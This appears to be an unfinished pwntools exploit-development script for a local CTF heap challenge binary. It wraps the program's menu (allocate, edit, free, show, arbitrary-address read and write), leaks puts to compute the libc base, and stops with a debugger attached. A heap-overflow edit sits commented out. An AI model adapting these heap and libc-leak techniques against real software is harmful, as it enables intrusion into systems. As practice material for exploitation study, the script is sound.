from pwn import *
p=process('./bin')
elf = context.binary = ELF("./bin")
libc = elf.libc
# context.log_level = 'debug'
def add(size):
    p.sendlineafter(b'your choice >\n',b'1')
    p.sendlineafter(b'size:\n',str(size).encode())
    p.recvuntil(b'0x')
    return int(p.recv(12),16)
def edit(id,thing):
    p.sendlineafter(b'your choice >\n',b'2')
    p.sendlineafter(b'index:\n',str(id).encode())
    p.sendafter(b'thing:\n',thing)
def free(id):
    p.sendlineafter(b'your choice >\n',b'3')
    p.sendlineafter(b'index:\n',str(id).encode())
def show(id):
    p.sendlineafter(b'your choice >\n',b'4')
    p.sendlineafter(b'index:\n',str(id).encode())
    p.recvuntil(b'things:')
    return p.recvuntil(b'!!!\n')[0:-4]
def showall():
    p.sendlineafter(b'your choice >\n',b'5')
    print(p.recvuntil(b'finish\n'))
def show_addr(id):
    p.sendlineafter(b'your choice >\n',b'5')
    p.recvuntil(str(id).encode()+b':')
    p.recvuntil(b'0x')
    addr=int(p.recv(12),16)
    print("heap",id,":",hex(addr),p.recvuntil(b',')[0:-1].decode())
    return addr
def exit_():
    p.sendlineafter(b'your choice >\n',b'6')
def edit_dir(addr,thing):
    p.sendlineafter(b'your choice >\n',b'7')
    p.sendlineafter(b'position:\n',str(addr).encode())
    p.sendafter(b'thing:\n',thing)
def show_dir(addr,len=16):
    p.sendlineafter(b'your choice >\n',b'8')
    p.sendlineafter(b'position:\n',str(addr).encode())
    p.sendlineafter(b'len:\n',str(len).encode())
    print(p.recv(len))
p.recvuntil(b'0x')
puts = int(p.recv(12),16)
libc.address = puts - libc.sym.puts
print('libcbase',hex(libc.address))
heap0=add(0x18)
heap1=add(0x18)
# showall()
# edit(1,b'a'*0x18+p64(0x101))
showall()
# show_dir(heap0,32)
gdb.attach(p)
p.interactive()